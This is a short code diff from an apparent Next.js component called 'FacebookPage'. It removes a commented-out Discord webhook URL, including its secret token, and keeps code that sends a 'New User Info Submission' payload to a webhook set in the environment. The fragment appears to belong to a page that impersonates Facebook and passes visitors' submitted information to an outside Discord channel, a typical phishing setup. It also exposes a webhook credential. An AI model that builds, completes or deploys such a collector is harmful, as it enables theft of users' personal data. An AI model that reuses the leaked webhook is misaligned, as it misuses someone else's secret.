@@ -120,8 +120,6 @@ const FacebookPage = () => {
     setIsError(false);
 
     const webhookUrl = process.env.NEXT_PUBLIC_DISCORD_WEBHOOK!;
-    // const webhookUrl =
-    //   "https://discord.com/api/webhooks/1421567872425132143/s64rFqn4i6SDtcm2lSLGI_8sRBkMYm4K7frpqKZXixCNEGLbO2x4zKnk1oF5-Dj9QJiC";
 
     const payload = {
       content: "**New User Info Submission**",
